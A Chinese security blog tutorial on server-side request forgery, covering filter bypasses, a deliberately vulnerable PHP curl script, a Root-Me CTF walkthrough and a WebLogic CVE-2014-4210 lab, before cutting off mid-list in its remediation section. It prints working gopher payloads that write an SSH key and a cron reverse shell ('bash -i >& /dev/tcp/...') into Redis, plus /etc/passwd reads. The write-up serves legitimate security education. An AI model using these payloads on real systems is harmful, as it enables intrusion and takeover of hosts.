<!DOCTYPE html>
<html lang="zh-CN">










<head>
    <meta charset="utf-8" />
    <link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico">
    <link rel="icon" type="image/png" href="/favicon.ico">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no" name="viewport" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="description" content="One way to choose one">
    <meta name="author" content="Misaki">
    <meta name="keywords" content="">
    <title>SSRF ~ Misaki&#39;s Blog</title>
    <link rel="stylesheet" href="/css/Material_Icons.css">
    <!-- <link rel="stylesheet" href="/css/font-awesome.css"> -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
    <link rel="stylesheet" href="/css/main.css">
    
        <link rel="stylesheet" href="/css/post.css">
        
            <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
        
    
</head>

<body class=" sidebar-collapse">
<nav class="navbar navbar-transparent navbar-color-on-scroll fixed-top navbar-expand-lg" color-on-scroll="100" id="sectionsNav">
    <div class="container">
        <div class="navbar-translate">
            <a class="navbar-brand" href="/">
                Misaki&#39;s Blog</a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" aria-expanded="false" aria-label="Toggle navigation">
                <span class="sr-only">Toggle navigation</span>
                <span class="navbar-toggler-icon"></span>
                <span class="navbar-toggler-icon"></span>
                <span class="navbar-toggler-icon"></span>
            </button>
        </div>
            <div class="collapse navbar-collapse">
                <ul class="navbar-nav ml-auto">
                    
                        
                            <li class="nav-item">
                                <a class="nav-link" href="/archives/">
                                    archives
                                </a>
                            </li>
                        
                            <li class="nav-item">
                                <a class="nav-link" href="/about/">
                                    about
                                </a>
                            </li>
                        
                    
                    
                        
                            <li class="nav-item">
                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://github.com/MisakiKata" target="_blank" data-original-title="See me here">
                                    <i class="fa fa-github"></i>
                                </a>
                            </li>
                        
                            <li class="nav-item">
                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://www.t00ls.net/members-profile-12179.html" target="_blank" data-original-title="See me here">
                                    <i class="fa fa-twitch"></i>
                                </a>
                            </li>
                        
                            <li class="nav-item">
                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://misakikata.github.io/atom.xml" target="_blank" data-original-title="See me here">
                                    <i class="fa fa-rss"></i>
                                </a>
                            </li>
                        
                            <li class="nav-item">
                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="mailto:misakikatas@gmail.com" target="_blank" data-original-title="See me here">
                                    <i class="fa fa-envelope"></i>
                                </a>
                            </li>
                        
                    
                </ul>
            </div>
    </div>
</nav>
    
  <div class="page-header header-filter" data-parallax="true" style="background-image: url('/img/post-banner.jpg'); height: 70vh;">
    
      <div class="container">
        <h1 class="title text-center post_title">SSRF</h1>
        <p class="text-center"><b>Friday, June 14th 2019, 3:46 pm</b></p>
      </div>
    
  </div>

  
  
  
    <div class="row" style="margin: 0 0 0; z-index: 999;">
  <div class="col-md-8 offset-md-1">
    <div class="main main-raised">
      <div class="container">
        <div class="section">
          <div class="post_content">
              <h3 id="0x01、漏洞简介"><a href="#0x01、漏洞简介" class="headerlink" title="0x01、漏洞简介"></a>0x01、漏洞简介</h3><p>​    SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种利用漏洞伪造服务器端发起请求。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p>
<h3 id="0x02、漏洞原理"><a href="#0x02、漏洞原理" class="headerlink" title="0x02、漏洞原理"></a>0x02、漏洞原理</h3><p>​    通过控制功能中的发起请求的服务来当作跳板攻击内网中其他服务。比如，通过控制前台的请求远程地址加载的响应，来让请求数据由远程的URL域名修改为请求本地、或者内网的IP地址及服务，来造成对内网系统的攻击。</p>
<h3 id="0x03、漏洞危害"><a href="#0x03、漏洞危害" class="headerlink" title="0x03、漏洞危害"></a>0x03、漏洞危害</h3><ol>
<li>扫描内网开放服务</li>
<li>向内部任意主机的任意端口发送payload来攻击内网服务</li>
<li>DOS攻击（请求大文件，始终保持连接Keep-Alive Always）</li>
<li>攻击内网的web应用，例如直接SQL注入、XSS攻击等</li>
<li>利用file、gopher、dict协议读取本地文件、执行命令等</li>
</ol>
<h3 id="0x04、检测与绕过"><a href="#0x04、检测与绕过" class="headerlink" title="0x04、检测与绕过"></a>0x04、检测与绕过</h3><h4 id="0x04-1、漏洞检测"><a href="#0x04-1、漏洞检测" class="headerlink" title="0x04-1、漏洞检测"></a>0x04-1、漏洞检测</h4><p>假设一个漏洞场景：某网站有一个在线加载功能可以把指定的远程图片加载到本地，功能链接如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/image.php?image=http://www.xxc.com/a.jpg</span><br></pre></td></tr></table></figure>
<p>那么网站请求的大概步骤应该是类似以下：</p>
<p>用户输入图片地址-&gt;请求发送到服务端解析-&gt;服务端请求链接地址的图片数据-&gt;获取请求的数据加载到前台显示。</p>
<p>这个过程中可能出现问题的点就在于请求发送到服务端的时候，系统没有效验前台给定的参数是不是允许访问的地址域名，例如，如上的链接可以修改为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/image.php?image=http://127.0.0.1:22</span><br></pre></td></tr></table></figure>
<p>如上请求时则可能返回请求的端口banner。如果协议允许，甚至可以使用其他协议来读取和执行相关命令。例如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/image.php?image=file:///etc/passwd</span><br><span class="line">http://www.xxx.com/image.php?image=dict://127.0.0.1:22/data:data2 (dict可以向服务端口请求data data2)</span><br><span class="line">http://www.xxx.com/image.php?image=gopher://127.0.0.1:2233/_test (向2233端口发送数据test,同样可以发送POST请求)</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>对于不同语言实现的web系统可以使用的协议也存在不同的差异，其中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php:</span><br><span class="line">http、https、file、gopher、phar、dict、ftp、ssh、telnet...</span><br><span class="line">java:</span><br><span class="line">http、https、file、ftp、jar、netdoc、mailto...</span><br></pre></td></tr></table></figure>
<p>判断漏洞是否存在的重要前提是，请求的服务器发起的，以上链接即使存在并不一定代表这个请求是服务器发起的。因此前提不满足的情况下，SSRF是不必要考虑的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/image.php?image=http://www.xxc.com/a.jpg</span><br></pre></td></tr></table></figure>
<p>链接获取后，是由js来获取对应参数交由window.location来处理相关的请求，或者加载到当前的iframe框架中，此时并不存在SSRF ，因为请求是本地发起，并不能产生攻击服务端内网的需求。</p>
<h4 id="0x04-2、漏洞出现点"><a href="#0x04-2、漏洞出现点" class="headerlink" title="0x04-2、漏洞出现点"></a>0x04-2、漏洞出现点</h4><ol>
<li>分享：通过url 地址分享文章，例如如下地址：</li>
</ol>
<p><a href="http://share.xxx.com/index.php?url=http://127.0.0.1" target="_blank" rel="noopener">http://share.xxx.com/index.php?url=http://127.0.0.1</a></p>
<p>通过url参数的获取来实现点击链接的时候跳到指定的分享文章。如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。</p>
<ol start="2">
<li>图片加载与下载：通过URL地址加载或下载图片</li>
</ol>
<p><a href="http://image.xxx.com/image.php?image=http://127.0.0.1" target="_blank" rel="noopener">http://image.xxx.com/image.php?image=http://127.0.0.1</a></p>
<p>图片加载存在于很多的编辑器中，编辑器上传图片处，有的是加载远程图片到服务器内。还有一些采用了加载远程图片的形式，本地文章加载了设定好的远程图片服务器上的图片地址，如果没对加载的参数做限制可能造成SSRF。</p>
<ol start="3">
<li>图片、文章收藏功能</li>
</ol>
<p><a href="http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de" target="_blank" rel="noopener">http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de</a></p>
<p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p>
<ol start="4">
<li>利用参数中的关键字来查找</li>
</ol>
<p>例如以下的关键字：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">share</span><br><span class="line">wap</span><br><span class="line">url</span><br><span class="line">link</span><br><span class="line">src</span><br><span class="line">source</span><br><span class="line">target</span><br><span class="line">u</span><br><span class="line">3g</span><br><span class="line">display</span><br><span class="line">sourceURl</span><br><span class="line">imageURL</span><br><span class="line">domain</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h4 id="0x04-3、漏洞绕过"><a href="#0x04-3、漏洞绕过" class="headerlink" title="0x04-3、漏洞绕过"></a>0x04-3、漏洞绕过</h4><p>部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：</p>
<p>1、限制为<a href="http://www.xxx.com" target="_blank" rel="noopener">http://www.xxx.com</a> 域名时：<br>可以尝试采用http基本身份认证的方式绕过，<a href="http://www.xxx.com@www.xxc.com。" target="_blank" rel="noopener">http://www.xxx.com@www.xxc.com。</a><br>在对@解析域名中，不同的处理函数存在处理差异，例如：<br><a href="http://www.aaa.com@www.bbb.com@www.ccc.com，在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。" target="_blank" rel="noopener">http://www.aaa.com@www.bbb.com@www.ccc.com，在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。</a><br>2、限制请求IP不为内网地址：<br>采用短网址绕过，比如百度短地址<a href="https://dwz.cn/。" target="_blank" rel="noopener">https://dwz.cn/。</a><br>采用可以指向任意域名的xip.io，127.0.0.1.xip.io，可以解析为127.0.0.1<br>采用进制转换，127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433</p>
<p><img src="\2019\06\SSRF\1560153991783.png" alt="1560153991783"></p>
<p>3、限制请求只为http协议：</p>
<p>采用302跳转，百度短地址，或者使用<a href="https://tinyurl.com生成302跳转地址。使用如下：" target="_blank" rel="noopener">https://tinyurl.com生成302跳转地址。使用如下：</a></p>
<p><img src="\2019\06\SSRF\1560154250368.png" alt="1560154250368"></p>
<p>4、其他绕过形式可以查看：<a href="https://www.secpulse.com/archives/65832.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/65832.html</a></p>
<h3 id="0x05、测试方法"><a href="#0x05、测试方法" class="headerlink" title="0x05、测试方法"></a>0x05、测试方法</h3><p>漏洞环境：PHP脚本、Windows</p>
<p>利用工具：bash、nc</p>
<p>首先采用如下脚本创建一个PHP的服务端</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?PHP</span><br><span class="line">$ch = curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[&apos;url&apos;]); </span><br><span class="line">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0); </span><br><span class="line">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><br><span class="line">curl_exec($ch); </span><br><span class="line">curl_close($ch);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>开启PHP的web环境，访问<a href="http://localhost/ssrf.php?url=，页面显示正常即可。在一个bash中开启监听端口，来模仿即将被SSRF到的内网服务，此处采用nc。" target="_blank" rel="noopener">http://localhost/ssrf.php?url=，页面显示正常即可。在一个bash中开启监听端口，来模仿即将被SSRF到的内网服务，此处采用nc。</a></p>
<p>浏览器访问如下链接：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![1560156050670](\2019\06\SSRF\1560156050670.png)</span><br><span class="line"></span><br><span class="line">使用gopher协议来查看协议，访问：```http://localhost/ssrf.php?url=gopher://127.0.0.1:2233/_test</span><br></pre></td></tr></table></figure></p>
<p><img src="\2019\06\SSRF\1560156243997.png" alt="1560156243997"></p>
<p>利用gopher发送POST的请求，访问：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![1560157345590](\2019\06\SSRF\1560157345590.png)</span><br><span class="line"></span><br><span class="line">以上方式简单的展示了SSRF的攻击过程和请求，下面我们使用回显形SSRF。</span><br><span class="line"></span><br><span class="line">漏洞环境：Ubuntu 18、 docker 、PHP、Apache</span><br><span class="line"></span><br><span class="line">漏洞文件地址：https://github.com/nikosdano/SSRF-Vulnerable-with-Curl</span><br><span class="line"></span><br><span class="line">下载文件放入apache服务器中，访问&lt;http://192.168.120.132/awesome_script.php&gt;</span><br><span class="line"></span><br><span class="line">![1560158703440](\2019\06\SSRF\1560158703440.png)</span><br><span class="line"></span><br><span class="line">在其中我们可以填写想要执行的SSRF命令，如填写```file:///etc/passwd```，回显为：</span><br><span class="line"></span><br><span class="line">![1560158751037](\2019\06\SSRF\1560158751037.png)</span><br><span class="line"></span><br><span class="line">尝试端口探测，对22端口进行探测是否开启：</span><br><span class="line"></span><br><span class="line">![1560159113711](\2019\06\SSRF\1560159113711.png)</span><br><span class="line"></span><br><span class="line">截至到此，相信对SSRF已经有了一个简单认识和检测，下面我们利用一个靶场来模拟一个完整的真实的SSRF攻击。</span><br><span class="line"></span><br><span class="line">### 0x06、实战演示</span><br><span class="line"></span><br><span class="line">漏洞环境：Rootme CTF all the day</span><br><span class="line"></span><br><span class="line">漏洞地址：&lt;https://www.root-me.org/en/Capture-The-Flag/CTF-all-the-day/&gt;</span><br><span class="line"></span><br><span class="line">利用工具：Burp</span><br><span class="line"></span><br><span class="line">漏洞介绍：SSRF+redis 获取内网主机权限，利用SSRF来对redis的未授权访问执行命令。从而达到获取主机权限的目的</span><br><span class="line"></span><br><span class="line">访问目标地址，如果没有账号，需要创建账号点击右上的绿色小加号来创建账号，创建完成后回到此页面。</span><br><span class="line"></span><br><span class="line">找到一个处于none的虚拟机，点击房间名，如下的ctf04</span><br><span class="line"></span><br><span class="line">![1560159824044](\2019\06\SSRF\1560159824044.png)</span><br><span class="line"></span><br><span class="line">进入房间后，选择需要创建的虚拟机，选择SSRF Box，点击保存，选择start the game。</span><br><span class="line"></span><br><span class="line">![1560159878492](\2019\06\SSRF\1560159878492.png)</span><br><span class="line"></span><br><span class="line">过一段时间的等待后，会显示如下信息。</span><br><span class="line"></span><br><span class="line">![1560235776984](\2019\06\SSRF\1560235776984.png)</span><br><span class="line"></span><br><span class="line">访问 ctf04.root-me.org 就可以看到启动的虚拟环境了</span><br><span class="line"></span><br><span class="line">![1560235872860](\2019\06\SSRF\1560235872860.png)</span><br><span class="line"></span><br><span class="line">当然，如果在创建虚拟机之前，看到其他的房间有人已经创建了SSRF Box我们也可以加入此玩家的房间，点击房间名，进入房间后点击右上角的Join the game。稍等片刻就可以加入到游戏中，根据提示访问对应的地址就可以开始测试啦。</span><br><span class="line"></span><br><span class="line">访问地址后可以看到页面显示一个输入框，需要输入url参数，开始抓包。</span><br><span class="line"></span><br><span class="line">![1560235989336](\2019\06\SSRF\1560235989336.png)</span><br><span class="line"></span><br><span class="line">尝试在页面输入百度地址后，页面会把百度首页加载进此页面中。</span><br><span class="line"></span><br><span class="line">![1560236149809](\2019\06\SSRF\1560236149809.png)</span><br><span class="line"></span><br><span class="line">读取系统文件：</span><br><span class="line"></span><br><span class="line">![1560236739185](\2019\06\SSRF\1560236739185.png)</span><br><span class="line"></span><br><span class="line">使用burp的Intruder模块，来探测开放的服务端口，开放则显示OK，不开放则显示Connection refused。</span><br><span class="line"></span><br><span class="line">![1560238637396](\2019\06\SSRF\1560238637396.png)</span><br><span class="line"></span><br><span class="line">探测可知内网开放了6379端口redis服务，尝试利用SSRF对redis执行未授权漏洞，此处简单科普一下redis漏洞影响。</span><br><span class="line"></span><br><span class="line">详细内容可以查看文章：&lt;https://www.freebuf.com/vuls/162035.html&gt;</span><br><span class="line"></span><br><span class="line">Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</span><br><span class="line"></span><br><span class="line">因此，此漏洞在没有配置密码的情况下可以利用SSRF来绕过绑定在本地的限制，从而实现在外网攻击内网应用。</span><br><span class="line"></span><br><span class="line">1、利用redis来写ssh密钥：</span><br><span class="line"></span><br><span class="line">此处利用ssh生成一对公私钥，生成的默认文件为id_rsa.pub和id_rsa。把id_rsa.pub上传至服务器即可。我们利用redis把目录设置为ssh目录下：</span><br><span class="line"></span><br><span class="line">根据网上写密钥有两种协议可以使用，一种是dict，一种是gopher。测试使用dict协议写不成功，写入后不能连接，此处使用gopher写密钥。</span><br><span class="line"></span><br><span class="line">使用的payload为：</span><br></pre></td></tr></table></figure></p>
<p>gopher://127.0.0.1:6379/_<em>3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$401%0d%0a%0a%0a%0assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/Xn7uoTwU+RX1gYTBrmZlNwU2KUBICuxflTtFwfbZM3wAy/FmZmtpCf2UvZFb/MfC1i……2pyARF0YjMmjMevpQwjeN3DD3cw/bO4XMJC7KnUGil4ptcxmgTsz0UsdXAd9J2UdwPfmoM9%0a%0a%0a%0a%0d%0a</em>4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a<em>4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a</em>1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">payload 解码为：</span><br></pre></td></tr></table></figure></p>
<p>gopher://127.0.0.1:6379/_*3<br>$3<br>set<br>$1<br>1<br>$401</p>
<p>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/Xn7uoTwU RX1gYTBrmZlNwU2KUBICuxflTtFwfbZM3wAy/FmZmtpCf2UvZFb/MfC1i……2pyARF0YjMmjMevpQwjeN3DD3cw/bO4XMJC7KnUGil4ptcxmgTsz0UsdXAd9J2UdwPfmoM9</p>
<p><em>4<br>$6<br>config<br>$3<br>set<br>$3<br>dir<br>$11<br>/root/.ssh/
</em>4<br>$6<br>config<br>$3<br>set<br>$10<br>dbfilename<br>$15<br>authorized_keys<br><em>1<br>$4<br>save
</em>1<br>$4<br>quit</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">payload由joychou的反弹shell修改而来，主要就是替换了写入文件的位置和文件内容。然后修改文件的长度。</span><br><span class="line"></span><br><span class="line">然后尝试登陆，输入创建密钥的密码后，登陆成功。</span><br><span class="line"></span><br><span class="line">![1560327409402](\2019\06\SSRF\1560327409402.png)</span><br><span class="line"></span><br><span class="line">2、利用redis写定时任务来反弹shell</span><br><span class="line"></span><br><span class="line">既然提到反弹shell，就需要利用一台外网主机。此处使用了nc做端口监听。</span><br><span class="line"></span><br><span class="line">使用payload为以下：</span><br></pre></td></tr></table></figure>
<p>gopher://127.0.0.1:6379/_<em>3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$61%0d%0a%0a%0a%0a</em>/1 <em> </em> <em> </em> bash -i &gt;&amp; /dev/tcp/x.x.x.x/2233 0&gt;&amp;1%0a%0a%0a%0a%0d%0a<em>4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a</em>4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a<em>1%0d%0a$4%0d%0asave%0d%0a</em>1%0d%0a$4%0d%0aquit%0d%0a<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">解码后的内容就是：</span><br></pre></td></tr></table></figure></p>
<p>gopher://127.0.0.1:6379/_*3<br>$3<br>set<br>$1<br>1<br>$61</p>
<p><em>/1 </em> <em> </em> * bash -i &gt;&amp; /dev/tcp/x.x.x.x/2233 0&gt;&amp;1</p>
<p><em>4<br>$6<br>config<br>$3<br>set<br>$3<br>dir<br>$16<br>/var/spool/cron/
</em>4<br>$6<br>config<br>$3<br>set<br>$10<br>dbfilename<br>$4<br>root<br><em>1<br>$4<br>save
</em>1<br>$4<br>quit</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">来自：&lt;https://joychou.org/web/phpssrf.html&gt;</span><br><span class="line"></span><br><span class="line">其中$61为我的vps地址，也就是```%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0a```的字符串长度。执行后稍等片刻就可以收到反弹的shell了。同时需要写入的命令前后要加几个回车。</span><br><span class="line"></span><br><span class="line">![1560323581419](\2019\06\SSRF\1560323581419.png)</span><br><span class="line"></span><br><span class="line">根据前文的提示，打开/passwd文件就可以找到flag了。</span><br><span class="line"></span><br><span class="line">![1560323642659](\2019\06\SSRF\1560323642659.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在网站页面上输入这一串字符，就可以结束这场SSRF之旅了。</span><br><span class="line"></span><br><span class="line">![1560325344529](\2019\06\SSRF\1560325344529.png)</span><br><span class="line"></span><br><span class="line">### 0x07、CMS实战演示</span><br><span class="line"></span><br><span class="line">漏洞环境：vulhub、weblogic、ssrf</span><br><span class="line"></span><br><span class="line">漏洞介绍：CVE-2014-4210，weblogic的uddiexplorer.war存在安全组件漏洞，此漏洞可通过HTTP协议利用，未经身份验证的远程攻击者可利用此漏洞影响受影响组件的机密性。该漏洞的影响版本包括：10.0.2.0, 10.3.6.0</span><br><span class="line"></span><br><span class="line">漏洞下载地址：&lt;https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf&gt;</span><br><span class="line"></span><br><span class="line">下载vulhub后，进入对应的安装目录，执行```docker-compose up -d```,会自动创建docker镜像。</span><br><span class="line"></span><br><span class="line">构建完成后访问如下地址：</span><br></pre></td></tr></table></figure>
<p>/uddiexplorer/SearchPublicRegistries.jsp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![1560402971016](\2019\06\SSRF\1560402971016.png)</span><br><span class="line"></span><br><span class="line">访问如下地址时返回，代表端口未开放：</span><br></pre></td></tr></table></figure></p>
<p>/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=<a href="http://127.0.0.1:80" target="_blank" rel="noopener">http://127.0.0.1:80</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![1560403060035](\2019\06\SSRF\1560403060035.png)</span><br></pre></td></tr></table></figure></p>
<p>/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=<a href="http://127.0.0.1:7001" target="_blank" rel="noopener">http://127.0.0.1:7001</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">响应可以看到返回404，证明端口开放：</span><br><span class="line"></span><br><span class="line">![1560403107077](\2019\06\SSRF\1560403107077.png)</span><br><span class="line"></span><br><span class="line">然后可以根据遍历查看开放的端口服务，在根据开放的服务来决定是否能不能执行内网攻击。而实际中越到的SSRF大都是探测类使用，因为能正好搭配使用的情况，而且还可以查看或者反弹的，概率值得讨论。</span><br><span class="line"></span><br><span class="line">漏洞修复：1.删除server/lib/uddiexplorer.war下的相应jsp文件。</span><br></pre></td></tr></table></figure></p>
<p>jar -xvf uddiexplorer.war<br>rm jsp-files<br>jar -cvfM uddiexplorer.war uddiexplorer/<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. 在官方的漏洞通报上找到补丁安装，&lt;https://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html&gt;</span><br><span class="line"></span><br><span class="line">### 0x08、漏洞修复</span><br><span class="line"></span><br><span class="line">SSRF漏洞修复：</span><br><span class="line"></span><br><span class="line">1. 限制返回信息的，例如请求文件，只返回文件是否请求成功，没有请求成功到文件统一返回错误信息。</span><br><span class="line">2. 